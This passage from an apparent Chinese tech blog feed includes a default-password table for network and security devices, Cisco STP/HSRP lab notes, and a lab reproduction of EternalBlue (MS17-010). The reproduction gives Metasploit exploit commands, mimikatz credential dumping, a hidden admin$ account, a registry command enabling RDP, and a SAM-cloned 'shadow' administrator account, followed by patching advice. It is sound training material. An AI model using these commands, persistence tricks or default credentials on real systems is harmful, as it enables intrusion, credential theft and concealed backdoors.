align="center"><code>hillstone</code></td><td align="center"><code>hillstone</code></td></tr><tr><td align="center">网康日志中心</td><td align="center"><code>ns25000</code></td><td align="center"><code>ns25000</code></td></tr><tr><td align="center">网络安全审计系统（中科新业）</td><td align="center"><code>admin</code></td><td align="center"><code>123456</code></td></tr><tr><td align="center">天玥网络安全审计系统</td><td align="center"><code>Admin</code></td><td align="center"><code>cyberaudit</code></td></tr><tr><td align="center">明御WEB应用防火墙</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>adminadmin</code></td></tr><tr><td align="center">明御攻防实验室平台</td><td align="center"><code>root</code></td><td align="center"><code>123456</code></td></tr><tr><td align="center">明御安全网关</td><td align="center"><code>admin</code></td><td align="center"><code>adminadmin</code></td></tr><tr><td align="center">明御运维审计与册风险控制系统</td><td align="center"><code>admin</code></td><td align="center"><code>1q2w3e</code></td></tr><tr><td align="center"></td><td align="center"><code>system</code></td><td align="center"><code>1q2w3e4r</code></td></tr><tr><td align="center"></td><td align="center"><code>auditor</code></td><td align="center"><code>1q2w3e4r</code></td></tr><tr><td align="center"></td><td align="center"><code>operator</code></td><td align="center"><code>1q2w3e4r</code></td></tr><tr><td align="center">明御网站卫士</td><td align="center"><code>sysmanager</code></td><td align="center"><code>sysmanager888</code></td></tr><tr><td align="center">亿邮邮件网关</td><td align="center"><code>eyouuser</code></td><td align="center"><code>eyou_admin</code></td></tr><tr><td align="center"></td><td align="center"><code>eyougw</code></td><td align="center"><code>admin@(eyou)</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>+-ccccc</code></td></tr><tr><td align="center"></td><td align="center"><code>admin</code></td><td align="center"><code>cyouadmin</code></td></tr><tr><td align="center">Websense邮件安全网关</td><td align="center"><code>adminstrator</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">梭子鱼邮件存储网关</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">华为交换机（S5720S）</td><td align="center"><code>admin</code></td><td align="center"><code>admin@huawei.com</code></td></tr><tr><td align="center">华为交换机（AR160）</td><td align="center"><code>admin</code></td><td align="center"><code>Admin@huawei.com</code></td></tr><tr><td align="center">中移路由器（link7）</td><td align="center"><code>hadmin</code></td><td align="center"><code>hadmin</code></td></tr><tr><td align="center">华为猫</td><td align="center"><code>CMCCAdmin</code></td><td align="center"><code>aDm8H%MdA</code></td></tr><tr><td align="center">飞余星 VR4900G</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr><tr><td align="center">D-Link （DIR-619）</td><td align="center"><code>admin</code></td><td align="center">空</td></tr><tr><td align="center">TP-LINK （TL-WVR300）</td><td align="center"><code>admin</code></td><td align="center"><code>admin</code></td></tr></tbody></table><p>参考连接：</p><ul><li><a href="https://blog.51cto.com/5001660/2525485" target="_blank" rel="noopener">常用设备管理口默认用户名密码汇总</a></li><li><a href="https://blog.csdn.net/weixin_40399254/article/details/106469069" target="_blank" rel="noopener">常见安全设备默认口令清单</a></li><li><a href="https://blog.csdn.net/weixin_34209851/article/details/85166684" target="_blank" rel="noopener">常见网络设备默认的登陆账号和密码大全</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之STP+HSRP实验</title>
      <link href="/2020/11/25/wang-luo-pei-zhi-zhi-stp-hsrp-shi-yan/"/>
      <url>/2020/11/25/wang-luo-pei-zhi-zhi-stp-hsrp-shi-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/实验拓扑.png" alt="实验拓扑"></center><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ul><li>全网互通；</li><li>未发生故障状态下，VLAN10的根网桥为MultiSwitch0，VLAN20的根网桥为MultiSwitch1；</li><li>MultiSwitch0和MultiSwitch1组合配置HSRP。</li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="0x01-基础配置"><a href="#0x01-基础配置" class="headerlink" title="0x01 基础配置"></a>0x01 基础配置</h2><ol><li><p>打开PC配置界面，进行静态IP配置操作，其中PC0的配置结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/PC0配置IP.png" alt="PC0配置IP"></center><p>其他PC的配置ll和PC0配置相似。</p></li><li><p>打开Switch0配置界面，配置VLAN，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/Switch0配置.png" alt="Switch0配置"></center></li><li><p>打开Switch1配置界面，配置VLAN，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/Switch1配置.png" alt="Switch1配置"></center></li><li><p>打开MultiSwitch0配置界面，完成VLAN、IP和路由设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/MutiSwitch0基础配置.png" alt="MutiSwitch0基础配置"></center></li><li><p>打开MultiSwitch1配置界面，完成VLAN、IP和路由设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/MultiSwitch1基础配置.png" alt="MultiSwitch1基础配置"></center></li><li><p>打开Router0配置界面，配置端口和路由，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/Router0基础配置.png" alt="Router0基础配置"></center></li><li><p>打开Web-Server配置界面，设置Web-Server的IP操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/Web-Server配置IP.png" alt="Web-Server配置IP"></center></li><li><p>将PC0的默认网关设置为<code>192.168.10.2</code>，并测试PC0和Web-Server的连通性，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/PC0网络基础配置连通性测试.png" alt="PC0网络基础配置连通性测试"></center></li></ol><h2 id="0x02-STP配置"><a href="#0x02-STP配置" class="headerlink" title="0x02 STP配置"></a>0x02 STP配置</h2><ol><li><p>打开MultiSwitch0配置界面，使用如下命令设置STP配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/MultiSwitch0配置STP.png" alt="MultiSwitch0配置STP"></center></li><li><p>打开MultiSwitch1配置界面，使用如下命令设置STP配置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/MultiSwitch1配置STP.png" alt="MultiSwitch1配置STP"></center></li><li><p>在MultiSwitch1中查看STP配置，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/查看MultiSwitch的STP配置.png" alt="查看MultiSwitch的STP配置"></center></li><li><p>假设F0/4接口故障，PC0中进行连通性测试，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/PC0连通测试1.png" alt="PC0连通测试"></center><p>由于MultiSwitch0仅仅设置了默认路由，导致VLAN10的路由直接挂掉，修改PC0的默认网关为<code>192.168.10.3</code>，再进行连通性测试，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/PC0连通性测试2.png" alt="PC0连通性测试"></center></li></ol><h2 id="0x03-HSRP配置"><a href="#0x03-HSRP配置" class="headerlink" title="0x03 HSRP配置"></a>0x03 HSRP配置</h2><ol><li><p>打开MultiSwitch0配置界面，设置HSRP，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/Switch0配置HSRP1.png" alt="Switch0配置HSRP"></center></li><li><p>打开MultiSwitch1配置界面，设置HSRP，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/Switch1配置HSRP1.png" alt="Switch1配置HSRP"></center></li><li><p>修改PC0的默认网关为<code>192.168.10.1</code>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/PC0配置默认网关.png" alt="PC0配置默认网关"></center></li><li><p>使用PC0进行连通性测试，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/PC0连通性测试3.png" alt="PC0连通性测试"></center></li><li><p>在MultiSwitch0中查看HSRP，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/查看HSRP结果.png" alt="查看HSRP结果"></center></li><li><p>假设MultiSwitch0的F0/4发生故障，查看HSRP结果和测试连通性，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/查看HSRP配置结果2.png" alt="查看HSRP配置结果"></center></li><li><p>使用PC0进行连通性测试，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP-STP/PC连通性测试3.png" alt="PC连通性测试"></center></li></ol><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><ul><li>STP+HSRP实现热备份冗余</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HSRP </tag>
            
            <tag> STP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现之永恒之蓝(ms17-010)</title>
      <link href="/2020/11/24/lou-dong-fu-xian-zhi-yong-heng-zhi-lan-ms17-010/"/>
      <url>/2020/11/24/lou-dong-fu-xian-zhi-yong-heng-zhi-lan-ms17-010/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>​        Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p><p>​        2017年5月12日起，全球范围内爆发基于Windows网络共享协议进行攻击传播的蠕虫恶意代码，这是不法分子通过改造之前泄露的NSA黑客武器库中“永恒之蓝”攻击程序发起的网络攻击事件。五个小时内，包括英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件，对重要数据造成严重损失。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>​        目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p><h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul><li>攻击机：Kali 2020.08（IP：10.10.10.152）</li><li>靶机：Windows 7 X64 （IP：10.10.10.129）</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/实验拓扑.png" alt="实验拓扑"></center><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="0x01主机发现"><a href="#0x01主机发现" class="headerlink" title="0x01主机发现"></a>0x01主机发现</h2><ol><li><p>在nmap中使用如下命令来探测本网段存活主机，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">nmap -r 10.10.10.0/24</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/nmap主机存活判断.png" alt="nmap主机存活判断"></center><p>探测到ip为<code>10.10.10.129</code>的主机存活，并探测到开放<code>445</code>端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p></li></ol><h2 id="0x02-进入MSF框架"><a href="#0x02-进入MSF框架" class="headerlink" title="0x02 进入MSF框架"></a>0x02 进入MSF框架</h2><ol><li><p>输入<code>msfconsole</code>命令进入MSF框架，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/msfconsole.png" alt="msfconsole"></center></li><li><p>输入<code>search ms17-010</code>命令，查看MSF框中与ms17-010相关的渗透模块，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/与ms17-010相关模块.png" alt="与ms17-010相关模块"></center><ul><li><code>auxiliary/scanner/smb/smb_ms17_010</code>是扫描MS17-010永恒之蓝的模块，扫描或者说检查目标主机是否存在MS17-010永恒之蓝的漏洞；</li><li><code>exploit/windows/smb/ms17_010_eternalblue</code>是永恒之蓝攻击代码的模块，就是所说的漏洞利用模块。</li></ul></li></ol><h2 id="0x03-ms17-010扫描模块"><a href="#0x03-ms17-010扫描模块" class="headerlink" title="0x03 ms17-010扫描模块"></a>0x03 ms17-010扫描模块</h2><ol><li><p>输入如下命令，使用永恒之蓝的扫描模块，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">use auxiliary/scanner/smb/smb_ms17_010</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/使用永恒之蓝扫描模块.png" alt="使用永恒之蓝扫描模块"></center></li><li><p>设置目标主机的IP（RHOST），输入如下命令，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">set rhosts 10.10.10.129</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/设置RHOSTS值.png" alt="设置RHOSTS值"></center></li><li><p>使用扫描探测，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/永恒之蓝扫描结果.png" alt="永恒之蓝扫描结果"></center><p>扫描结果显示目标主机可能存在永恒之蓝漏洞，下面使用攻击模块机型见攻击测试。</p></li></ol><h2 id="0x04-ms17-010攻击模块"><a href="#0x04-ms17-010攻击模块" class="headerlink" title="0x04 ms17-010攻击模块"></a>0x04 ms17-010攻击模块</h2><ol><li><p>使用如下命令进入永恒之蓝的攻击模块，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/进入永恒之蓝攻击模块.png" alt="进入永恒之蓝攻击模块"></center></li><li><p>使用<code>options</code>命令查看必须要手动配置的参数，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看攻击模块需要配置的参数.png" alt="查看攻击模块需要配置的参数"></center></li><li><p>使用<code>set rhosts 10.10.10.129</code>命令来设置远程主机的IP地址，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/攻击模块设置远程主机IP.png" alt="攻击模块设置远程主机IP"></center></li><li><p>永恒之蓝攻击模块默认，缺省使用的Payload为<code>windows/x64/meterpreter/reverse_tcp</code>，如果想使用其他Payload需要重新设置，这里使用默认的Payload。</p></li><li><p>输入<code>exploit</code>命令后MSF开始攻击渗透，攻击成功后得到一个<code>meterpreter</code>会话，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/永恒之蓝拿到shell.png" alt="永恒之蓝建立meterpreter会话"></center></li><li><p>输入<code>shell</code>拿到目标主机shell控制权，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/拿到目标数据shell权限.png" alt="拿到目标数据shell权限"></center><p>此时我们已经拿到了目标主机（WIN7）的shell控制权限，之后可以通过Shell对目标靶机进行控制。接下来就是进入了后渗透阶段。</p></li><li><p>用msf中的<code>mimikatz</code>，爆出目标主机的用户名和密码，<code>Wdigest</code>读取内存存放的账号密码，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/通过读取内存爆用户密码.png" alt="通过读取内存爆用户密码"></center></li></ol><h2 id="0x05-后渗透阶段"><a href="#0x05-后渗透阶段" class="headerlink" title="0x05 后渗透阶段"></a>0x05 后渗透阶段</h2><ol><li><p>首先使用如下命令创建一个用户并将其提权为管理员，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">net user admin$ 123.com /addnet localgroup administrators admin$ /add</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建权限维持用户.png" alt="创建权限维持用户"></center></li><li><p>提权以后我们需要打开目标主机的3389远程桌面端口，以便使用3389端口控制对方系统，输入如下命令，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/强制打开3389端口.png" alt="强制打开3389端口"></center><p>使用nmap探测远程主机端口，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程主机端口扫描2.png" alt="远程主机端口扫描"></center></li><li><p>打开远程桌面后就需要登录测试一下，但是再测试之前最好先使用<code>screenshot</code>命令获取截屏，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程桌面截屏.png" alt="远程桌面截屏"></center></li><li><p>使用如下命令连接目标主机的远程桌面，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">rdesktop 10.10.10.129</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/登录远程桌面.png" alt="登录远程桌面"></center><p><font color="red">在Windows 7中登录远程桌面时，若已经有用户登录，则会显示夺权信息，若无操作30s后会成功访问。</font></p></li><li><p>远程登录操作结果显示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/远程登录成功.png" alt="远程登录成功"></center></li></ol><h2 id="0x06-影子账户"><a href="#0x06-影子账户" class="headerlink" title="0x06 影子账户"></a>0x06 影子账户</h2><ol><li><p>创建一个名为<code>ss$</code>的用户，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/创建新用户作为影子账户.png" alt="创建新用户作为影子账户"></center></li><li><p>使用<code>regedit</code>打开注册表<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/</code>，显示结果如下图所示。<font color="blue">若打不开则需要设置权限，默认情况下SAM文件夹只有SYSTEM具有完全控制权限。</font></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/打开注册表.png" alt="打开注册表"></center></li><li><p>在Names文件夹中点击【<code>ss$</code>】，在右侧显示16进制数值如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/查看ss$用户.png" alt="查看ss$用户"></center></li><li><p>找到Administrator的十六进制数字，然后找到对应的00000（十六进制）文件夹打开，复制Administrator的<strong>000001F4</strong>文件夹里面的<strong>F值</strong>到我们的隐藏账户<code>ss$</code>里面的<strong>F值</strong>中，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户修改F值.gif" alt="影子账户修改F值"></center></li><li><p>找到Names里面的<code>ss$</code>和<code>ss$</code>对应的十六进制目录，右键导出到桌面，操作结果如下如所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导出.png" alt="注册表导出"></center></li><li><p>使用<code>net user ss$ /del</code>命令删除<code>ss$</code>用户，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/删除ss$用户.png" alt="删除ss$用户"></center></li><li><p>将刚刚导出的注册表信息重新导入，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/注册表导入.png" alt="注册表导入"></center></li><li><p>使用影子账户<code>ss$</code>登录，其实是以Administrator的身份登录，影子账户所做操作，Administrator都可以看见。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/POC/ms17-010/影子账户登录.png" alt="影子账户登录"></center></li></ol><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul><li><p>升级微软补丁MS17-010</p></li><li><p>Windows7、Windows8、Windows10电脑启用Windows防火墙添加策略关闭135、137、138、139、445端口</p></li><li><p>(若有杀软)升级杀毒软件最新版本</p></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://mp.weixin.qq.com/s/xUEmnaFNP44iLzdw3WDrDg" target="_blank" rel="noopener">【漏洞复现】MS17-010永恒之蓝</a></li><li><a href="https://www.cnblogs.com/-1au/p/10176389.html" target="_blank" rel="noopener">影子账户</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之HSRP实验</title>
      <link href="/2020/11/24/wang-luo-pei-zhi-zhi-hsrp-shi-yan/"/>
      <url>/2020/11/24/wang-luo-pei-zhi-zhi-hsrp-shi-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/实验拓扑.png" alt="实验拓扑"></center><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ul><li>配置HSRP并保证其稳健性</li><li>理解并掌握HSRP原理</li><li>保证网络连通性</li></ul><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="0x01-基础环境配置"><a href="#0x01-基础环境配置" class="headerlink" title="0x01 基础环境配置"></a>0x01 基础环境配置</h2><ol><li><p>打开内网PC设置界面，选择【Desktop】选项卡中的【IP Configuration】图标打开IP设置界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/PC0配置IP.png" alt="PC0配置IP"></center></li><li><p>打开交换设置界面，在【CLI】选项卡中对交换机进行设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/Switch0配置.png" alt="Switch0配置"></center></li><li><p>打开Router0（左边）设置界面，在【CLI】选项卡中对路由器的IP和路由进行设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/Router0基础胚子.png" alt="Router0基础配置"></center></li><li><p>打开Router1（右边）设置界面，在【CLI】选项卡中对路由器的IP和路由进行设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/Router1基础配置.png" alt="Router1基础配置"></center></li><li><p>打开Router2（上边）设置界面，在【CLI】选项卡中对路由器的IP和路由进行设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/Router2基础配置.png" alt="Router2基础配置"></center></li><li><p>打开外网PC设置界面，选择【Desktop】选项卡中的【IP Configuration】图标打开IP设置界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/PC1配置IP.png" alt="PC1配置IP"></center></li><li><p>基础环境已经配置完成，这里先将PC0的默认网关设置为<code>192.168.1.1</code>以验证网络的连通性。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/基础环境连通性测试.png" alt="基础环境连通性测试"></center><p>如上图显示结果所示，网络的基础环境设置完成。</p></li></ol><h2 id="0x02-配置HSRP"><a href="#0x02-配置HSRP" class="headerlink" title="0x02 配置HSRP"></a>0x02 配置HSRP</h2><ol><li><p>使用如下命令在Router0中配置HSRP，操作结果如下图所示。</p><pre class=" language-powershell"><code class="language-powershell">int f0<span class="token operator">/</span>0standby 100 ip 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3standby 100 priority 100standby 100 preempt </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/Router0配置HSRP.png" alt="Router0配置HSRP"></center></li><li><p>使用如下命令在Router1中配置HSRP，操作结果如下图所示。</p><pre class=" language-powershell"><code class="language-powershell">int f0<span class="token operator">/</span>0standby 100 ip 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3standby 100 priority 105standby 100 preempt </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/Router1配置HSRP.png" alt="Router1配置HSRP"></center></li><li><p>在Router1中查看HSRP配置，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/查看HSRP配置结果.png" alt="查看HSRP配置结果"></center></li></ol><h2 id="0x03-验证HSRP"><a href="#0x03-验证HSRP" class="headerlink" title="0x03 验证HSRP"></a>0x03 验证HSRP</h2><p>​        假设Router1的F0/0接口出现问题，按照HSRP原理，整个网络仍然可以正常传输数据，操作结果如下图所示。</p><ol><li><p>使用<code>shotdown</code>命令关闭Router1路由的F0/0接口，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/关闭Router1路由的00端口.png" alt="关闭Router1路由的00端口"></center></li><li><p>重新配置PC0的IP信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/PC0配置IP.png" alt="PC0配置IP1"></center></li><li><p>使用PC0测试网络的连通性，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/PC0测试网络连通性1.png" alt="PC0测试网络连通性"></center><p>由上图结果可知HSRP配置成功，但是这里配置还存在一个问题。</p></li></ol><h2 id="0x04-优化HSRP"><a href="#0x04-优化HSRP" class="headerlink" title="0x04 优化HSRP"></a>0x04 优化HSRP</h2><p>​        上述情况在<code>F0/0</code>故障时没有问题，但是在<code>F0/1</code>出现故障时，数据仍然发送不出去，链路情况如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/断点故障.png" alt="断点故障"></center><p>​        要解决这种情况，需要配置端口追踪，当端口出现问题时，主路由器会自动降级，以保证备份路由启动。</p><ol><li><p>在Router1中配置端口追踪，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/配置端口追踪.png" alt="配置端口追踪"></center></li><li><p>在Router1中查看HSRP状态，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/查看HSRP状态2.png" alt="查看HSRP状态"></center><p>这种情况下要成功夺权需要确定已经配置占先权，否则使用<code>standby 100 preempt</code>命令配置占先权。</p></li><li><p>使用PC0进行网络连通性测试，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/HSRP/网络连通性测试3.png" alt="网络连通性测试"></center></li></ol><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><ul><li>PT中HSRP的端口追踪自动降级数值不能配置，但其默认值为10。</li><li>在HSRP中占先权非常重要，若不设置及时满足转换条件也不能夺权。</li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><pre class=" language-powershell"><code class="language-powershell">Switch0配置：enconf tint range f0<span class="token operator">/</span>1<span class="token operator">-</span>2switchport mode trunkRoute0：enconf tint f0<span class="token operator">/</span>0ip add 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>1 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0no shint f0<span class="token operator">/</span>1ip add 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>2<span class="token punctuation">.</span>1 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0no sh<span class="token keyword">exit</span>ip route 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>2<span class="token punctuation">.</span>2int f0<span class="token operator">/</span>0standby 100 ip 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3standby 100 priority 100standby 100 preempt <span class="token keyword">exit</span>跟踪端口：int f0<span class="token operator">/</span>0standby 100 track f0<span class="token operator">/</span>1Route1:enconf tint f0<span class="token operator">/</span>0ip add 192<span class="token punctuation">.</span>168<span 